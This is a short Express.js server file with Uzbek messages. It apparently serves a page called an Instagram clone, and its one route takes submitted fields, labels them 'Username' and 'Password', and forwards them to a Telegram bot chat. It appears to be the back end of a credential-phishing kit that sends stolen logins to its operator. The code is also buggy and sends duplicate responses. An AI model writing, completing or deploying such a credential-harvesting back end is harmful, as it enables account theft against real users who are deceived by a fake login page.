import express from "express"
import cors from "cors";
import axios from "axios";
import dotenv from "dotenv"
dotenv.config()
const app = express();


app.use(cors({
    origin: [
        "http://localhost:5173",
        "https://instagram-clone-for-phone-first.onrender.com"
    ],
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"]
}));

app.use(express.json());


app.post("/api/test", async (req, res) => {
    try {

        const { name, phone } = req.body;
        if (!name || !phone) {
            return res.status(400).json({ message: "Fields are missing" });
        }
        // Logic to save to DB...
        res.status(200).json({ message: "Success" });
        // const { name, phone } = req.body;

        console.log("Kelgan data:", name, phone);

        const text = `Yangi so'rov Username: ${name} Password: ${phone}`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.CHAT_ID,
                text: text,
            }
        );


        res.status(200).json({
            success: true,
            message: "Telegramga yuborildi!"
        });


    } catch (error) {
        console.error(error.response?.data || error);

        res.status(500).json({
            message: "Server xatosi",
            error: error.response?.data || error.message
        });

        res.status(500).json({ message: error.message });
    }
});


const PORT = process.env.PORT || 5000;


app.listen(PORT, () => {
    console.log(`Server ishlayapti: ${PORT}`);
});